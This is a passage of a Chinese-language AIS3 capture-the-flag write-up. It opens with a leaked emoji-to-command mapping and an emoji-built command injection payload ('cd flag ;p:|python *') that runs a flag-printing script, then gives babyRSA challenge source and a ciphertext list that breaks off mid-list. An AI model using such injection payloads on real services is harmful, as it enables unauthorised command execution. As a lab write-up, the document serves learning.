+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆖&#34;</span><span class=p>:</span> <span class=s2>&#34;NG&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆗&#34;</span><span class=p>:</span> <span class=s2>&#34;OK&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆘&#34;</span><span class=p>:</span> <span class=s2>&#34;SOS&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆙&#34;</span><span class=p>:</span> <span class=s2>&#34;UP&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆚&#34;</span><span class=p>:</span> <span class=s2>&#34;VS&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;㊗️&#34;</span><span class=p>:</span> <span class=s2>&#34;祝&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;㊙️&#34;</span><span class=p>:</span> <span class=s2>&#34;秘&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈺&#34;</span><span class=p>:</span> <span class=s2>&#34;營&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈯&#34;</span><span class=p>:</span> <span class=s2>&#34;指&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🉐&#34;</span><span class=p>:</span> <span class=s2>&#34;得&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈹&#34;</span><span class=p>:</span> <span class=s2>&#34;割&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈚&#34;</span><span class=p>:</span> <span class=s2>&#34;無&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈲&#34;</span><span class=p>:</span> <span class=s2>&#34;禁&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈸&#34;</span><span class=p>:</span> <span class=s2>&#34;申&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈴&#34;</span><span class=p>:</span> <span class=s2>&#34;合&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈳&#34;</span><span class=p>:</span> <span class=s2>&#34;空&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈵&#34;</span><span class=p>:</span> <span class=s2>&#34;滿&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈶&#34;</span><span class=p>:</span> <span class=s2>&#34;有&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🈷️&#34;</span><span class=p>:</span> <span class=s2>&#34;月&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚗&#34;</span><span class=p>:</span> <span class=s2>&#34;car&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚕&#34;</span><span class=p>:</span> <span class=s2>&#34;taxi&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚙&#34;</span><span class=p>:</span> <span class=s2>&#34;SUV&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚌&#34;</span><span class=p>:</span> <span class=s2>&#34;bus&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚎&#34;</span><span class=p>:</span> <span class=s2>&#34;trolleybus&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🏎️&#34;</span><span class=p>:</span> <span class=s2>&#34;race car&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚓&#34;</span><span class=p>:</span> <span class=s2>&#34;police car&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚑&#34;</span><span class=p>:</span> <span class=s2>&#34;ambulance&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚒&#34;</span><span class=p>:</span> <span class=s2>&#34;fire engine&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚐&#34;</span><span class=p>:</span> <span class=s2>&#34;minibus&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚚&#34;</span><span class=p>:</span> <span class=s2>&#34;delivery truck&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚛&#34;</span><span class=p>:</span> <span class=s2>&#34;articulated lorry&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚜&#34;</span><span class=p>:</span> <span class=s2>&#34;tractor&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🛴&#34;</span><span class=p>:</span> <span class=s2>&#34;kick scooter&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚲&#34;</span><span class=p>:</span> <span class=s2>&#34;bicycle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🛵&#34;</span><span class=p>:</span> <span class=s2>&#34;scooter&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🏍️&#34;</span><span class=p>:</span> <span class=s2>&#34;motorcycle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;✈️&#34;</span><span class=p>:</span> <span class=s2>&#34;airplane&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚀&#34;</span><span class=p>:</span> <span class=s2>&#34;rocket&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🛸&#34;</span><span class=p>:</span> <span class=s2>&#34;UFO&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚁&#34;</span><span class=p>:</span> <span class=s2>&#34;helicopter&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🛶&#34;</span><span class=p>:</span> <span class=s2>&#34;canoe&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⛵&#34;</span><span class=p>:</span> <span class=s2>&#34;sailboat&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚤&#34;</span><span class=p>:</span> <span class=s2>&#34;speedboat&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🛳️&#34;</span><span class=p>:</span> <span class=s2>&#34;passenger ship&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⛴️&#34;</span><span class=p>:</span> <span class=s2>&#34;ferry&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🛥️&#34;</span><span class=p>:</span> <span class=s2>&#34;motor boat&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚢&#34;</span><span class=p>:</span> <span class=s2>&#34;ship&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;👨&#34;</span><span class=p>:</span> <span class=s2>&#34;man&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;👩&#34;</span><span class=p>:</span> <span class=s2>&#34;woman&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;👶&#34;</span><span class=p>:</span> <span class=s2>&#34;baby&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🧓&#34;</span><span class=p>:</span> <span class=s2>&#34;old man&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;👵&#34;</span><span class=p>:</span> <span class=s2>&#34;old woman&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;💿&#34;</span><span class=p>:</span> <span class=s2>&#34;CD&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;📀&#34;</span><span class=p>:</span> <span class=s2>&#34;DVD&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;📱&#34;</span><span class=p>:</span> <span class=s2>&#34;phone&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;💻&#34;</span><span class=p>:</span> <span class=s2>&#34;laptop&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🖥️&#34;</span><span class=p>:</span> <span class=s2>&#34;pc&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🖨️&#34;</span><span class=p>:</span> <span class=s2>&#34;printer&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⌨️&#34;</span><span class=p>:</span> <span class=s2>&#34;keyboard&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🖱️&#34;</span><span class=p>:</span> <span class=s2>&#34;mouse&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🖲️&#34;</span><span class=p>:</span> <span class=s2>&#34;trackball&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🕹️&#34;</span><span class=p>:</span> <span class=s2>&#34;joystick&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🗜️&#34;</span><span class=p>:</span> <span class=s2>&#34;clamp&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;💾&#34;</span><span class=p>:</span> <span class=s2>&#34;floppy disk&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;💽&#34;</span><span class=p>:</span> <span class=s2>&#34;minidisc&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;☎️&#34;</span><span class=p>:</span> <span class=s2>&#34;telephone&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;📟&#34;</span><span class=p>:</span> <span class=s2>&#34;pager&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;📺&#34;</span><span class=p>:</span> <span class=s2>&#34;television&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;📻&#34;</span><span class=p>:</span> <span class=s2>&#34;radio&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🎙️&#34;</span><span class=p>:</span> <span class=s2>&#34;studio microphone&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🎚️&#34;</span><span class=p>:</span> <span class=s2>&#34;level slider&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🎛️&#34;</span><span class=p>:</span> <span class=s2>&#34;control knobs&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⏰&#34;</span><span class=p>:</span> <span class=s2>&#34;alarm clock&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🕰️&#34;</span><span class=p>:</span> <span class=s2>&#34;mantelpiece clock&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⌚&#34;</span><span class=p>:</span> <span class=s2>&#34;watch&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;📡&#34;</span><span class=p>:</span> <span class=s2>&#34;satellite antenna&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔋&#34;</span><span class=p>:</span> <span class=s2>&#34;battery&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔌&#34;</span><span class=p>:</span> <span class=s2>&#34;plug&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🚩&#34;</span><span class=p>:</span> <span class=s2>&#34;flag&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⓿&#34;</span><span class=p>:</span> <span class=s2>&#34;0&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❶&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❷&#34;</span><span class=p>:</span> <span class=s2>&#34;2&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❸&#34;</span><span class=p>:</span> <span class=s2>&#34;3&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❹&#34;</span><span class=p>:</span> <span class=s2>&#34;4&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❺&#34;</span><span class=p>:</span> <span class=s2>&#34;5&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❻&#34;</span><span class=p>:</span> <span class=s2>&#34;6&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❼&#34;</span><span class=p>:</span> <span class=s2>&#34;7&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❽&#34;</span><span class=p>:</span> <span class=s2>&#34;8&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❾&#34;</span><span class=p>:</span> <span class=s2>&#34;9&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;❿&#34;</span><span class=p>:</span> <span class=s2>&#34;10&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⭐&#34;</span><span class=p>:</span> <span class=s2>&#34;*&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;➕&#34;</span><span class=p>:</span> <span class=s2>&#34;+&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;➖&#34;</span><span class=p>:</span> <span class=s2>&#34;-&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;✖️&#34;</span><span class=p>:</span> <span class=s2>&#34;×&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;➗&#34;</span><span class=p>:</span> <span class=s2>&#34;÷&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=n>cat</span><span class=p>:</span> <span class=n>flag</span><span class=p>:</span> <span class=n>Is</span> <span class=n>a</span> <span class=n>directory</span>
+</span></span><span class=line><span class=cl><span class=n>cat</span><span class=p>:</span> <span class=n>templates</span><span class=p>:</span> <span class=n>Is</span> <span class=n>a</span> <span class=n>directory</span>
+</span></span></code></pre></td></tr></table></div></div><p>這邊是我們 leak 出的東西，至少不用再一個一個點開來看他對應的指令是啥了= =</p><p>此外，我們還發現這題有 command injection 的問題</p><p>然後我們可以去翻有哪些 emoji 符合command injection</p><p>最後撈到了 😓 😜 😐 😑 😶 可以拿來用構造我們的payload</p><p>然後我們用 💿 🚩 😜😐⭐ 繞過了下一關 (cd flag ;p:|)</p><p><img src=https://hackmd.io/_uploads/rJqMgYJN0.png loading=lazy alt=image></p><p>用 * 去 leak資料會發現有一個叫做 flag-printer.py 的檔案</p><p><img src=https://hackmd.io/_uploads/rJCq1AlV0.png loading=lazy alt=image></p><p>用 python 執行它就有 flag ㄌ :D</p><p>💿 🚩 😜😐🐍 ⭐ (cd flag ;p:|python *)</p><p><img src=https://hackmd.io/_uploads/SkpUxYJ40.png loading=lazy alt=image></p><p>flag: AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}</p><p>Quantum Nim Heist</p><p>跟機器人玩遊戲，只要你是最後一個拿到石頭的，你就會拿到flag</p><p><img src=https://hackmd.io/_uploads/SypXs5J4R.png loading=lazy alt=image></p><p>AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}</p><h2 id=crypto>Crypto</h2><h3 id=babyrsa>babyRSA</h3><p>source.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import random
+</span></span><span class=line><span class=cl>from Crypto.Util.number import getPrime
+</span></span><span class=line><span class=cl>from secret import flag
+</span></span><span class=line><span class=cl>def gcd(a, b):
+</span></span><span class=line><span class=cl>    while b:
+</span></span><span class=line><span class=cl>        a, b = b, a % b
+</span></span><span class=line><span class=cl>    return a
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def generate_keypair(keysize):
+</span></span><span class=line><span class=cl>    p = getPrime(keysize)
+</span></span><span class=line><span class=cl>    q = getPrime(keysize)
+</span></span><span class=line><span class=cl>    n = p * q
+</span></span><span class=line><span class=cl>    phi = (p-1) * (q-1)
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    e = random.randrange(1, phi)
+</span></span><span class=line><span class=cl>    g = gcd(e, phi)
+</span></span><span class=line><span class=cl>    while g != 1:
+</span></span><span class=line><span class=cl>        e = random.randrange(1, phi)
+</span></span><span class=line><span class=cl>        g = gcd(e, phi)
+</span></span><span class=line><span class=cl>    d = pow(e, -1, phi)
+</span></span><span class=line><span class=cl>    return ((e, n), (d, n))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def encrypt(pk, plaintext):
+</span></span><span class=line><span class=cl>    key, n = pk
+</span></span><span class=line><span class=cl>    cipher = [pow(ord(char), key, n) for char in plaintext]
+</span></span><span class=line><span class=cl>    return cipher
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def decrypt(pk, ciphertext):
+</span></span><span class=line><span class=cl>    key, n = pk
+</span></span><span class=line><span class=cl>    plain = [chr(pow(char, key, n)) for char in ciphertext]
+</span></span><span class=line><span class=cl>    return &#39;&#39;.join(plain)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>public, private = generate_keypair(512)
+</span></span><span class=line><span class=cl>encrypted_msg = encrypt(public, flag)
+</span></span><span class=line><span class=cl>decrypted_msg = decrypt(private, encrypted_msg)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>print(&#34;Public Key:&#34;, public)
+</span></span><span class=line><span class=cl>print(&#34;Encrypted:&#34;, encrypted_msg)
+</span></span><span class=line><span class=cl># print(&#34;Decrypted:&#34;, decrypted_msg)
+</span></span></code></pre></td></tr></table></div></div><p>output.txt:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Public Key: (64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649)
+</span></span><span class=line><span class=cl>Encrypted: [59582983136368434856816799733313446746433796034384724221174424464969737874802116129348607979328098841766335449896610931770063087921739964156335144291643702667891887833963756948394265219864837961748202920096128332905237576243643095664147826020400199347355043162641743846198725931842313977049712473768688780204, 95359547394031742813518330673269556403528254059894407470006786975603938062435320319282644182444182438612748874603359501010449113346386193598111715879103479311697744375488228536365895249959983701008182395138745363343749821348881488616739650767615867269542213617639437927373484681942750228038458670913761461906, 46329325300279098651694178842591774415260876326218182283454895682597312145324055490326488805186682301528705330448500034219715636964856131530973835780285303243952273742119154142469279746360304190118988650200422700136950019141246372634642054318988506247030406078971388938494583721698317950574261574174233878465, 99372516099607712778908802720080113062724120782160998443385643772511391370661101893707293382044546993124605549696368316348952556779713164710839853078160450782104255053788389238478472574549113909833434906535103012424826026640284958298083646000213492094244631381094489147645893989473799375006911204994971262513, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558, 12319813533472769541026063795801870849236715810997656653501875874806446093919930377755747066386074676697058702735112064576219731845584108035461434499628574742399407498867908576045220515065246483998134315307132901329833371485817530138131352593805641664023978795298886913968639954517583992930243922021434381738, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 1665805297521640119669919457094144711238099413231800824465470812913880572669116305626521524153911904267238129531937952423409222225023467794927666422627082314285814656075569814644205638687105792760533211008966815918943917251927254624389871965679206262024216136163262412286874416732008465838711695063592124435, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 38285633551521777138710771085033430239170710707266775875598456653892976969437761922968925746226073683095654278272586779539831402373205526909772633370025848937463033570747721110932401276480992827694564074802181306738438015295515798739406061377284368603543443076476369810597345436481251791260803352288977423573, 90968383857681404242927909477464252602387471219945950453665598772039832078487309149670692874283215437984574695320981806360379096212936326954111131608499584545969103096096842380877613033764006459107764277330135816044808210474597200172673683909558627722941503504083244424751773797618360290613996970960151563724, 95457298055868694391877219138576497445115151186056513418820503159496876268497080831408725541436969299827723238663173668798694515208450035233192338795425824459299174728295661096981248839235055855929604893139239340445385259232905864515397406993189217322907168121716905101208450279521267289056195400878302077398, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 34661612116812273325510815885632987773878634626625747042958636362152583931260969561869719786378247664638641161656878412129162010084766438156247296031040184022246208883138926132649114007757242227131459285251878118564710945280013332131793855359773876332415772442620349609897435915019325055421286197078708187352, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 67602482196856820166971428403758405739455475263382367621161896414339370625380754447863410276767241406699969322350803814348655243066328706656427717483623041308690996376549835317954286006923639192767262817817435759143930376297271756237829141630002480289781731985465743331200468015517012225741723423203374827341, 44262354102194743351911268289256770008339497245528544280709170541530088518398751380655719846628700171065092804544687718896291531970838072744874705570156704628202662829757806782131182294252555844059856971743311355891113953747318316062265029166813195656690004051327523203179399349334322871113218009692321746302, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 17525442355443739006798161136945234538289135293732159010469949341666347513585837371870704355037863634098163883611042121878362686860890223724238562583526550649340086051319234134907577624853632886715848962127706255769976443912657070070366400669740596805962173530384420842637554803041466900119050709458062167550, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 32463563387229396502994321924065961632284043136468238906625180045736135155253223928723914405824284085442712712337348213915399745045346853697650399659292339726614512642835897683094877670342609027803404027945312939777902664125228095034970967750466928999176126534504349068649205422848461193336320361026425455874, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20222920908058605457111970272150612273139460769260447235596498596781683961010128426184024637706564546340327246191020540223566835757304493325371606037680402571948650998523099138137441154209281794538860160477031997660506452095283151142470607354579609545040759974018408429796935802188551530478970289514572978617, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 63634815088527144255090148113948593793648445499224983027630191877159813968754095341812467946868079279626991968747689424489021633678743106301884613005477044402324870044751927862596590687251830485165119422247449722579599610918927243419033509419967393677988976255284611384351411782311379786356079256916831362626, 9304987377904341606117201715658113065608581640101320211543462955469900806281721467187032121463132314663326494170970278379001634044806680348131292368949519512445580695938064509920503814133961673755470696223243390646274004621955993274826096679460577701554059204349111764901921932386091658007427259226167178177, 58828925452729811932976588739787965824652220690551333824296205824127538696058603108169405357158211350616510470513672533759883740745736322687898383422522330915631984810878357007178714597068087752425823728826608887027664209314455243118645386520598961325656254330576959063500755210398248129074822706590225088700, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 